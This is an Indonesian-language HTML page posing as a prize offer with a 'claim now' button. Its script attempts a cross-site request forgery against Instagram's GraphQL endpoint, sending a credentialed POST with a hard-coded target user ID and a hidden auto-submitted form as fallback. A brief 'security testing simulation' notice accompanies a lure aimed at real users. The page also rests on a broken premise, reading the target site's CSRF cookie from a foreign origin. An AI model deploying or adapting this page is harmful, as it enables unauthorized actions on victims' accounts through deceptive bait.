<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Penawaran Spesial Terbatas!</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #1a1a2e;
            color: #e6e6e6;
            line-height: 1.6;
        }
        .container {
            background: linear-gradient(135deg, #16213e 0%, #0f3460 100%);
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
            border: 1px solid #394867;
        }
        h1 {
            color: #4cc9f0;
            text-align: center;
            margin-bottom: 20px;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
        }
        .offer {
            text-align: center;
            margin: 25px 0;
            padding: 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            border-left: 4px solid #4361ee;
            backdrop-filter: blur(10px);
        }
        .button {
            display: block;
            width: 220px;
            margin: 30px auto;
            padding: 14px;
            background: linear-gradient(135deg, #4361ee 0%, #3a0ca3 100%);
            color: white;
            text-align: center;
            border-radius: 8px;
            text-decoration: none;
            font-weight: bold;
            cursor: pointer;
            border: none;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.4);
            background: linear-gradient(135deg, #4895ef 0%, #4361ee 100%);
        }
        .button:active {
            transform: translateY(0);
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
        }
        .info-box {
            background: rgba(255, 193, 7, 0.15);
            border: 1px solid #ffc107;
            border-radius: 8px;
            padding: 20px;
            margin: 25px 0;
            font-size: 15px;
        }
        .info-box h3 {
            margin-top: 0;
            color: #ffc107;
            border-bottom: 1px solid #ffc107;
            padding-bottom: 10px;
        }
        .debug-info {
            background: rgba(200, 200, 200, 0.1);
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
            font-family: 'Fira Code', monospace;
            font-size: 14px;
            white-space: pre-wrap;
            border: 1px solid #4361ee;
            max-height: 300px;
            overflow-y: auto;
        }
        .debug-title {
            display: flex;
            justify-content: space-between;
            align-items: center;
            cursor: pointer;
            color: #4361ee;
            font-weight: bold;
            margin-bottom: 10px;
        }
        .cookie-list {
            margin-top: 15px;
            padding-top: 15px;
            border-top: 1px solid #394867;
        }
        .cookie-item {
            margin-bottom: 8px;
            padding: 8px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 5px;
            display: flex;
            justify-content: space-between;
        }
        .cookie-name {
            color: #4cc9f0;
            font-weight: bold;
        }
        .cookie-value {
            color: #f72585;
            word-break: break-all;
            max-width: 60%;
            text-align: right;
        }
        .footer {
            text-align: center;
            margin-top: 30px;
            font-size: 14px;
            color: #6c757d;
        }
        .success {
            color: #4ade80;
            font-weight: bold;
        }
        .error {
            color: #f94144;
            font-weight: bold;
        }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #4361ee;
            animation: spin 1s ease-in-out infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üõ°Ô∏è Penawaran Spesial Hari Ini!</h1>
        
        <div class="offer">
            <p>Selamat! Anda terpilih untuk mendapatkan penawaran eksklusif kami. 
               Klik tombol di bawah untuk mengklaim diskon spesial Anda.</p>
        </div>
        
        <button class="button" onclick="submitForm()">üéÅ Klaim Sekarang!</button>
        
        <div class="info-box">
            <h3>üìã Informasi Penting</h3>
            <p>Halaman ini adalah simulasi untuk testing keamanan. Request mungkin diblokir oleh kebijakan CORS atau perlindungan CSRF server.</p>
        </div>
        
        <div class="debug-title" onclick="toggleDebug()">
            <span>üêõ Info Debug (Klik untuk memperlihatkan/menyembunyikan)</span>
            <span id="debugIcon">‚ñº</span>
        </div>
        <div id="debugInfo" class="debug-info" style="display: none;">
            <div id="debugContent">
                Menunggu aksi...
            </div>
        </div>
    </div>
    
    <div class="footer">
        <p>¬© 2023 Contoh Situs. Semua hak dilindungi. | Hanya untuk tujuan edukasi dan testing yang sah</p>
    </div>

    <script>
        // Fungsi untuk mendapatkan nilai cookie berdasarkan nama
        function getCookie(name) {
            const cookieString = document.cookie;
            const cookies = cookieString.split('; ');
            
            for (const cookie of cookies) {
                const [cookieName, cookieValue] = cookie.split('=');
                if (cookieName === name) {
                    return decodeURIComponent(cookieValue);
                }
            }
            
            return null;
        }

        // Fungsi untuk menampilkan semua cookie yang tersedia
        function getAllCookies() {
            const cookieString = document.cookie;
            if (!cookieString) return [];
            
            return cookieString.split('; ').map(cookie => {
                const [name, value] = cookie.split('=');
                return { name, value: decodeURIComponent(value) };
            });
        }

        // Fungsi untuk menampilkan info debug
        function toggleDebug() {
            const debugInfo = document.getElementById('debugInfo');
            const debugIcon = document.getElementById('debugIcon');
            
            if (debugInfo.style.display === 'none') {
                const cookies = getAllCookies();
                let debugContent = '<div class="cookie-list">';
                
                debugContent += '<div><strong>Semua Cookie yang Terdeteksi:</strong></div>';
                
                if (cookies.length > 0) {
                    cookies.forEach(cookie => {
                        debugContent += `
                            <div class="cookie-item">
                                <span class="cookie-name">${cookie.name}</span>
                                <span class="cookie-value">${cookie.value}</span>
                            </div>
                        `;
                    });
                } else {
                    debugContent += '<div>Tidak ada cookie yang ditemukan</div>';
                }
                
                debugContent += '</div>';
                
                document.getElementById('debugContent').innerHTML = debugContent;
                debugInfo.style.display = 'block';
                debugIcon.innerHTML = '‚ñ≤';
            } else {
                debugInfo.style.display = 'none';
                debugIcon.innerHTML = '‚ñº';
            }
        }

        // Fungsi untuk melakukan submit form dengan header CSRF
        async function submitForm() {
            const debugContent = document.getElementById('debugContent');
            debugContent.innerHTML = '<span class="loading"></span> Memeriksa cookie...';
            document.getElementById('debugInfo').style.display = 'block';
            
            // Dapatkan nilai CSRF token dari cookie
            const csrfToken = getCookie('csrftoken');
            
            if (!csrfToken) {
                debugContent.innerHTML = `<span class="error">‚ùå CSRF Token tidak ditemukan dalam cookie.</span><br>
                Pastikan Anda sudah login ke situs target.<br><br>
                <strong>Cookie yang ditemukan:</strong><br>
                ${document.cookie || 'Tidak ada cookie'}`;
                return;
            }
            
            debugContent.innerHTML = `<span class="success">‚úÖ CSRF Token ditemukan: ${csrfToken}</span><br>
            <span class="loading"></span> Mengirim request ke: https://www.instagram.com/graphql/query...`;
            
            try {
                // Gunakan fetch API untuk mengirim request dengan header kustom
                const response = await fetch('https://www.instagram.com/graphql/query', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Csrftoken': csrfToken
                    },
                    body: JSON.stringify({
                        variables: '{"target_user_id":"39902309948"}',
                        doc_id: '9740159112729312'
                    }),
                    // Kirim cookie bersama request
                    credentials: 'include'
                });
                
                if (response.ok) {
                    const data = await response.text();
                    debugContent.innerHTML += `<br><br><span class="success">‚úÖ Request berhasil dikirim!</span><br>
                    <strong>Status:</strong> ${response.status} ${response.statusText}<br>
                    <strong>Response:</strong> ${data.substring(0, 200)}${data.length > 200 ? '...' : ''}`;
                } else {
                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                }
            } catch (error) {
                debugContent.innerHTML += `<br><br><span class="error">‚ùå Error: ${error.message}</span><br>
                Mencoba metode alternatif...`;
                
                // Fallback ke metode form submission tradisional
                setTimeout(() => {
                    try {
                        // Buat form secara dinamis
                        const form = document.createElement('form');
                        form.method = 'POST';
                        form.action = 'https://www.instagram.com/graphql/query';
                        form.style.display = 'none';
                        
                        // Tambahkan input fields
                        const variablesInput = document.createElement('input');
                        variablesInput.type = 'hidden';
                        variablesInput.name = 'variables';
                        variablesInput.value = '{"target_user_id":"39902309948"}';
                        form.appendChild(variablesInput);
                        
                        const docIdInput = document.createElement('input');
                        docIdInput.type = 'hidden';
                        docIdInput.name = 'doc_id';
                        docIdInput.value = '9740159112729312';
                        form.appendChild(docIdInput);
                        
                        // Tambahkan form ke body dan submit
                        document.body.appendChild(form);
                        form.submit();
                        
                        debugContent.innerHTML += `<br><br><span class="success">‚úÖ Form berhasil dikirim melalui iframe</span>`;
                    } catch (fallbackError) {
                        debugContent.innerHTML += `<br><br><span class="error">‚ùå Fallback juga gagal: ${fallbackError.message}</span>`;
                    }
                }, 1000);
            }
        }
        
        // Periksa cookie saat halaman dimuat
        window.onload = function() {
            const csrfToken = getCookie('csrftoken');
            const debugContent = document.getElementById('debugContent');
            
            if (csrfToken) {
                debugContent.innerHTML = `<span class="success">‚úÖ CSRF Token terdeteksi: ${csrfToken}</span><br>
                Siap untuk melakukan testing. Klik tombol "Klaim Sekarang!" di atas.`;
            } else {
                debugContent.innerHTML = `<span class="error">‚ùå CSRF Token tidak ditemukan.</span><br>
                Pastikan Anda sudah login ke situs target sebelum melakukan testing.`;
            }
        };
    </script>
</body>
</html>